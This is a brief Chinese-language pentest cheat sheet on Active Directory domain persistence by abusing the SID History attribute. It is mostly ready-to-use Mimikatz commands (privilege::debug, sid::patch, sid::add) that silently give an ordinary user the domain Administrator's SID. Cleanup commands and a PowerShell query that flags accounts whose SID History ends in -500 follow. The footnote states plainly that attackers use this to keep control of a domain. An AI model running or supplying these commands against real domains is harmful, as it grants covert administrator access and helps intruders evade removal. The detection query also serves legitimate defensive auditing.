**域迁移：利用SID History[^1]属性保持用户访问权限。**

```powershell
# On DC
privilege::debug
sid::patch
sid::add /sam:<Username> /new:administrator

Import-Module ActiveDirectory
Get-ADUser  <Username> -Properties sidhistory

wmic useraccount get name,sid #cmd下执行
```
## Clean Up
```powershell
# Use Mimikatz on DC to clean up
mimikatz.exe "privilege::debug" "sid::clear /sam:Username" exit

#使用powershell清理【管理员权限】
Get-ADUser aaa -Properties sidHistory
Set-ADUser -Identity <Username> -remove @{sidhistory='<Administrator_SID>'}

# 查询
Get-ADUser -Filter 'SIDHistory -like "*"' -SearchScope Subtree -Properties sidhistory|?{$_.sidhistory -like "*-500"}
# 清除
Get-ADUser -Filter 'SIDHistory -like "*"' -SearchScope Subtree -Properties sidhistory|?{$_.sidhistory -like "*-500"} | foreach {Set-ADUser $_ -remove @{sidhistory=$_.sidhistory.value}}
```

[^1]: SID History属性是域迁移中的关键特性，它用于保持用户的访问权限不变。在域迁移过程中，如果用户的安全标识符（SID）发生变更，系统会自动将旧的SID添加到用户的SID History属性中。这样做的目的是确保用户在迁移后仍然保留对原有资源的访问权限。利用这一特性，渗透测试工具如mimikatz可以用来将任意用户的旧SID添加到其他用户的SID History属性中。在获得域管理员权限的情况下，攻击者可以通过修改SID History属性来维持对域的控制，即使在用户账户的SID发生变化之后。